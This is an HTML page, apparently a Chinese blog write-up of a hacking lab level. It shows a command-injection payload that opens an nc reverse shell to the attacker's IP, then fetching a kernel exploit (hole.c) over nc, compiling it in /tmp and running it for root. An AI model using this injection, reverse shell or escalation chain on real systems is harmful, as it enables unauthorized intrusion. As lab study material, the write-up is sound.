@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>level 2 （nc与内核漏洞提权）</title>
+    <style type="text/css" media="all">
+      body {
+        margin: 0;
+        font-family: "Helvetica Neue", Helvetica, Arial, "Hiragino Sans GB", sans-serif;
+        font-size: 14px;
+        line-height: 20px;
+        color: #777;
+        background-color: white;
+      }
+      .container {
+        width: 700px;
+        margin-right: auto;
+        margin-left: auto;
+      }
+
+      .post {
+        font-family: Georgia, "Times New Roman", Times, "SimSun", serif;
+        position: relative;
+        padding: 70px;
+        bottom: 0;
+        overflow-y: auto;
+        font-size: 16px;
+        font-weight: normal;
+        line-height: 25px;
+        color: #515151;
+      }
+
+      .post h1{
+        font-size: 50px;
+        font-weight: 500;
+        line-height: 60px;
+        margin-bottom: 40px;
+        color: inherit;
+      }
+
+      .post p {
+        margin: 0 0 35px 0;
+      }
+
+      .post img {
+        border: 1px solid #D9D9D9;
+      }
+
+      .post a {
+        color: #28A1C5;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="post">
+        <h1 class="title">level 2 （nc与内核漏洞提权）</h1>
+        <div class="show-content">
+          <p><a href="http://www.jianshu.com/p/b94ae315b511" target="_blank">续上篇</a> </p><blockquote><p><i>192.168.1.1；/usr/local/bin/nc 攻击机ip 6666 -e /bin/sh</i></p></blockquote><div class="image-package">
+<img src="http://upload-images.jianshu.io/upload_images/2883590-f003ce6d25a119fb.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" data-original-src="http://upload-images.jianshu.io/upload_images/2883590-f003ce6d25a119fb.PNG?imageMogr2/auto-orient/strip" data-image-slug="f003ce6d25a119fb" data-width="665" data-height="223"><br><div class="image-caption"></div>
+</div><p>于是获得了 sh类型的shell</p><p>攻击机输入下面命令，目的是监听666端口，如果有主机连上它，就发送hole.c</p><div class="image-package">
+<img src="http://upload-images.jianshu.io/upload_images/2883590-2114924bd6434d7b.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" data-original-src="http://upload-images.jianshu.io/upload_images/2883590-2114924bd6434d7b.PNG?imageMogr2/auto-orient/strip" data-image-slug="2114924bd6434d7b" data-width="573" data-height="110"><br><div class="image-caption"></div>
+</div><p>shell上输入下面命令，目的是连接攻击机ip和端口。获得了hole.c文件，在屏幕上输入了该文件。但没办法光在shell上输出没有用，不能写入到一个文件中去。。</p><div class="image-package">
+<img src="http://upload-images.jianshu.io/upload_images/2883590-ec9440fbfa8408bc.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" data-original-src="http://upload-images.jianshu.io/upload_images/2883590-ec9440fbfa8408bc.PNG?imageMogr2/auto-orient/strip" data-image-slug="ec9440fbfa8408bc" data-width="379" data-height="128"><br><div class="image-caption"></div>
+</div><p>如果输入nc，会显示没有找到该命令</p><p>输入 /usr/local/bin/nc 攻击IP 666 &gt; file   ，意思是将666端口的文件存为file，但是显示没有这样的文件或目录，为了弄清问题出在哪，输入touch file</p><div class="image-package">
+<img src="http://upload-images.jianshu.io/upload_images/2883590-2e00fc7729d055e9.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" data-original-src="http://upload-images.jianshu.io/upload_images/2883590-2e00fc7729d055e9.PNG?imageMogr2/auto-orient/strip" data-image-slug="2e00fc7729d055e9" data-width="449" data-height="51"><br><div class="image-caption">图4<br>
+</div>
+</div><p>如果touch file，会显示不能新建file文件，请求拒绝。还是权限不够的问题吧</p><hr><p>尝试wget也是权限不够，nc也没用。</p><p>于是用 ls 查看权限，唉都是管理员权限的文件</p><div class="image-package">
+<img src="http://upload-images.jianshu.io/upload_images/2883590-06c74cc99f5263ac.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" data-original-src="http://upload-images.jianshu.io/upload_images/2883590-06c74cc99f5263ac.PNG?imageMogr2/auto-orient/strip" data-image-slug="06c74cc99f5263ac" data-width="471" data-height="115"><br><div class="image-caption"></div>
+</div><p>用pwd查看当前路径，cd ~</p><p>找到了一个有权限的 /tmp</p><p>于是执行图4，这次没有报错</p><p>gcc -o yes file</p><p>显示不知道file的类型</p><p>mv file file.c 更改文件名</p><p>gcc -o yes file.c</p><p>./yes</p><div class="image-package">
+<img src="http://upload-images.jianshu.io/upload_images/2883590-0694608ca60d4b67.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" data-original-src="http://upload-images.jianshu.io/upload_images/2883590-0694608ca60d4b67.PNG?imageMogr2/auto-orient/strip" data-image-slug="0694608ca60d4b67" data-width="348" data-height="98"><br><div class="image-caption"></div>
+</div><p>权限到手！- v -</p>
+        </div>
+      </div>
+    </div>
+  </body>
+</html>
